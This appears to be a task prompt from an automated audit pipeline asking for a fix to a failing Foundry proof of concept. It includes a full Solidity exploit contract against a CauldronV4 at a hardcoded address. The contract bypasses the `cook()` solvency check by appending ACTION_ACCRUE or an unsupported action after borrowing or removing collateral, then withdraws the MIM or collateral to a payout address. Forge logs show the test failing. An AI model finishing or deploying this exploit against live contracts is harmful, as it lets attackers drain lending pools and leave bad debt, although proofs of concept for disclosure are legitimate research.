You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.

Finding:
- title: `cook()` solvency enforcement can be cleared by `ACTION_ACCRUE` or any unsupported action
- claim: `cook()` sets `status.needsSolvencyCheck = true` after `ACTION_BORROW` and `ACTION_REMOVE_COLLATERAL`, but any unhandled action falls through to `_additionalCookAction()`. In `CauldronV4` that hook has an empty implementation and does not revert, yet `cook()` blindly replaces the current `status` with its return value. Because `ACTION_ACCRUE` is declared but never handled, and arbitrary unsupported action IDs also route there, a user can append one of those actions after borrowing or removing collateral to reset `needsSolvencyCheck` to `false` and skip the final insolvency check entirely.
- impact: An attacker can borrow MIM or withdraw collateral and finish the transaction undercollateralized, creating immediate bad debt and potentially draining the cauldron's available MIM.

Current FlawVerifier.sol:
```solidity
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IBentoBoxLike {
    function balanceOf(address token, address account) external view returns (uint256);
    function withdraw(
        address token,
        address from,
        address to,
        uint256 amount,
        uint256 share
    ) external returns (uint256 amountOut, uint256 shareOut);
}

interface ICauldronV4Like {
    function cook(
        uint8[] calldata actions,
        uint256[] calldata values,
        bytes[] calldata datas
    ) external payable returns (uint256 value1, uint256 value2);

    function bentoBox() external view returns (address);
    function magicInternetMoney() external view returns (address);
    function collateral() external view returns (address);
    function isSolvent(address user) external view returns (bool);
    function userBorrowPart(address user) external view returns (uint256);
    function userCollateralShare(address user) external view returns (uint256);
}

contract FlawVerifier {
    uint8 private constant ACTION_REMOVE_COLLATERAL = 4;
    uint8 private constant ACTION_BORROW = 5;
    uint8 private constant ACTION_ACCRUE = 8;

    ICauldronV4Like public constant TARGET = ICauldronV4Like(0x46f54d434063e5F1a2b2CC6d9AAa657b1B9ff82c);

    address public immutable owner;

    enum ExploitPath {
        None,
        BorrowThenAccrue,
        RemoveThenUnsupported
    }

    ExploitPath public exploitPath;
    uint256 public amountOrShare;
    uint8 public unsupportedAction;
    address public bentoReceiver;
    address public payoutRecipient;
    bool public withdrawAfter;

    event Configured(
        ExploitPath indexed path,
        uint256 amountOrShare,
        uint8 unsupportedAction,
        address indexed bentoReceiver,
        address indexed payoutRecipient,
        bool withdrawAfter
    );

    event ExploitExecuted(
        ExploitPath indexed path,
        uint256 beforeBorrowPart,
        uint256 afterBorrowPart,
        uint256 beforeCollateralShare,
        uint256 afterCollateralShare,
        bool solventBefore,
        bool solventAfter,
        uint256 value1,
        uint256 value2
    );

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    constructor() {
        owner = msg.sender;
        bentoReceiver = address(this);
        payoutRecipient = msg.sender;
        unsupportedAction = type(uint8).max;
    }

    function configureBorrowThenAccrue(uint256 borrowAmount, address _bentoReceiver, address _payoutRecipient, bool _withdrawAfter)
        external
        onlyOwner
    {
        require(borrowAmount > 0, "borrowAmount=0");
        exploitPath = ExploitPath.BorrowThenAccrue;
        amountOrShare = borrowAmount;
        unsupportedAction = ACTION_ACCRUE;
        bentoReceiver = _defaultReceiver(_bentoReceiver);
        payoutRecipient = _defaultRecipient(_payoutRecipient);
        withdrawAfter = _withdrawAfter;
        require(!withdrawAfter || bentoReceiver == address(this), "receiver must be this");
        emit Configured(exploitPath, amountOrShare, unsupportedAction, bentoReceiver, payoutRecipient, withdrawAfter);
    }

    function configureRemoveThenUnsupported(
        uint256 collateralShare,
        uint8 followupUnsupportedAction,
        address _bentoReceiver,
        address _payoutRecipient,
        bool _withdrawAfter
    ) external onlyOwner {
        require(collateralShare > 0, "collateralShare=0");
        require(_isUnsupportedAction(followupUnsupportedAction), "handled action");
        exploitPath = ExploitPath.RemoveThenUnsupported;
        amountOrShare = collateralShare;
        unsupportedAction = followupUnsupportedAction;
        bentoReceiver = _defaultReceiver(_bentoReceiver);
        payoutRecipient = _defaultRecipient(_payoutRecipient);
        withdrawAfter = _withdrawAfter;
        require(!withdrawAfter || bentoReceiver == address(this), "receiver must be this");
        emit Configured(exploitPath, amountOrShare, unsupportedAction, bentoReceiver, payoutRecipient, withdrawAfter);
    }

    function executeOnOpportunity() external {
        require(exploitPath != ExploitPath.None, "not configured");

        uint256 beforeBorrowPart = TARGET.userBorrowPart(address(this));
        uint256 beforeCollateralShare = TARGET.userCollateralShare(address(this));
        bool solventBefore = TARGET.isSolvent(address(this));

        uint8[] memory actions = new uint8[](2);
        uint256[] memory values = new uint256[](2);
        bytes[] memory datas = new bytes[](2);

        if (exploitPath == ExploitPath.BorrowThenAccrue) {
            actions[0] = ACTION_BORROW;
            actions[1] = ACTION_ACCRUE;
            datas[0] = abi.encode(_toInt256(amountOrShare), bentoReceiver);
            datas[1] = bytes("");
        } else {
            actions[0] = ACTION_REMOVE_COLLATERAL;
            actions[1] = unsupportedAction;
            datas[0] = abi.encode(_toInt256(amountOrShare), bentoReceiver);
            datas[1] = bytes("");
        }

        (uint256 value1, uint256 value2) = TARGET.cook(actions, values, datas);

        if (withdrawAfter) {
            _withdrawProceeds(value2);
        }

        uint256 afterBorrowPart = TARGET.userBorrowPart(address(this));
        uint256 afterCollateralShare = TARGET.userCollateralShare(address(this));
        bool solventAfter = TARGET.isSolvent(address(this));

        emit ExploitExecuted(
            exploitPath,
            beforeBorrowPart,
            afterBorrowPart,
            beforeCollateralShare,
            afterCollateralShare,
            solventBefore,
            solventAfter,
            value1,
            value2
        );
    }

    function rescueToken(address token, address to) external onlyOwner {
        uint256 balance = IERC20Like(token).balanceOf(address(this));
        require(IERC20Like(token).transfer(to, balance), "transfer failed");
    }

    function rescueBentoShares(address token, address to, uint256 share) external onlyOwner {
        IBentoBoxLike(TARGET.bentoBox()).withdraw(token, address(this), to, 0, share);
    }

    function _withdrawProceeds(uint256 borrowedMimShare) internal {
        IBentoBoxLike bento = IBentoBoxLike(TARGET.bentoBox());

        if (exploitPath == ExploitPath.BorrowThenAccrue) {
            address mim = TARGET.magicInternetMoney();
            uint256 share = borrowedMimShare;
            if (share == 0) {
                share = bento.balanceOf(mim, address(this));
            }
            if (share != 0) {
                bento.withdraw(mim, address(this), payoutRecipient, 0, share);
            }
        } else {
            address token = TARGET.collateral();
            uint256 share = amountOrShare;
            if (share == 0) {
                share = bento.balanceOf(token, address(this));
            }
            if (share != 0) {
                bento.withdraw(token, address(this), payoutRecipient, 0, share);
            }
        }
    }

    function _defaultReceiver(address candidate) internal view returns (address) {
        return candidate == address(0) ? address(this) : candidate;
    }

    function _defaultRecipient(address candidate) internal view returns (address) {
        return candidate == address(0) ? owner : candidate;
    }

    function _toInt256(uint256 value) internal pure returns (int256) {
        require(value <= uint256(type(int256).max), "value too large");
        return int256(value);
    }

    function _isUnsupportedAction(uint8 action) internal pure returns (bool) {
        return action != 2 && action != 4 && action != 5 && action != 6 && action != 7 && action != 8 && action != 10
            && action != 11 && action != 20 && action != 21 && action != 22 && action != 23 && action != 24
            && action != 30 && action != 31;
    }

    receive() external payable {}
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 119.10ms
Compiler run successful!

Ran 1 test for test/FlawVerifier.t.sol:FlawVerifierTest
[FAIL: not configured] testExploit() (gas: 8029)
Traces:
  [8029] FlawVerifierTest::testExploit()
    ├─ [2658] FlawVerifier::executeOnOpportunity()
    │   └─ ← [Revert] not configured
    └─ ← [Revert] not configured

Backtrace:
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.42s (1.24ms CPU time)

Ran 1 test suite in 1.51s (1.42s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/FlawVerifier.t.sol:FlawVerifierTest
[FAIL: not configured] testExploit() (gas: 8029)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. contract name `FlawVerifier`
3. function `executeOnOpportunity()` external
4. no imports
5. output ONLY Solidity code
